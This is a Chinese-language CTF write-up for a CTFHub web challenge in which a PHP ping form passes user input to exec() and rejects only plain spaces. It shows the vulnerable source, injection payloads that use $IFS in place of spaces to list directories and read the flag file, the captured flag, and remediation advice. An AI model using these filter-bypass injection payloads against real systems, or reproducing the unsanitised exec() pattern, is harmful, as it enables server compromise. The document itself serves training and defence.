CTFHub - Web - 命令注入-过滤空格

# CTFHub # Web # RCE # 命令注入 # 空格绕过

一、题目信息

  • 题目名称：命令注入-过滤空格
  • 题目方向：Web - RCE
  • 运行环境：PHP + Linux
  • 题目目标：在不提交普通空格的情况下执行带参数命令，读取动态 Flag 文件。

二、漏洞分析

页面源码显示，用户输入的 ip 被直接拼接到 ping 命令中。服务端只通过正则拒绝普通空格字符：

<?php
$ip = $_GET['ip'];
$m = [];

if (!preg_match_all("/ /", $ip, $m)) {
    $cmd = "ping -c 4 {$ip}";
    exec($cmd, $res);
} else {
    $res = $m;
}
?>

过滤并不完整：命令分隔符 ;、&&、| 仍可用；同时 Linux Shell 会在解析阶段将未加引号的 $IFS 展开为字段分隔符，因此可以用它替代命令参数之间的空格。

其他可行方式还包括 Tab（URL 编码为 %09）和花括号扩展，例如 {cat,/flag}。本题使用 $IFS，因为它清晰且不依赖具体 Shell 的扩展细节。

三、解题步骤

  1. 验证命令注入并查看根目录：

    输入以下载荷，其中 $IFS 会被替换为空格，使 ls 获得根目录参数。

    127.0.0.1;ls$IFS/

    对应 URL：

    http://<challenge-host>:10800/?ip=127.0.0.1%3Bls%24IFS%2F
  2. 定位动态 Flag 文件： 
    127.0.0.1;find$IFS/$IFS-name$IFS*flag*

    响应中找到本环境的随机文件名：

    /var/www/html/flag_26675793315701.php
  3. 使用 cat 和 $IFS 读取文件： 
    127.0.0.1;cat$IFS/var/www/html/flag_26675793315701.php

    命令输出被 exec() 收集并通过 print_r() 回显：

    <?php // ctfhub{8c4312611766ea95e61e3201}

    Flag 文件名为环境动态生成，实际复现时应使用目录枚举结果替换上述路径。

四、最终 Flag

ctfhub{8c4312611766ea95e61e3201}

五、修复建议

  • 严格校验输入：使用 filter_var($ip, FILTER_VALIDATE_IP) 校验目标地址，并拒绝命令分隔符、通配符和变量展开语法。
  • 不要拼接 Shell 命令：避免将用户输入直接传入 exec()；使用参数分离的安全 API，或对每个参数调用 escapeshellarg()。
  • 不要依赖单个字符黑名单：普通空格可由 $IFS、Tab 或其他 Shell 语法替代，过滤必须采用严格白名单。
  • 最小化权限：降低 Web 服务账户权限，并将 Flag 等敏感文件移出 Web 根目录及可读范围。
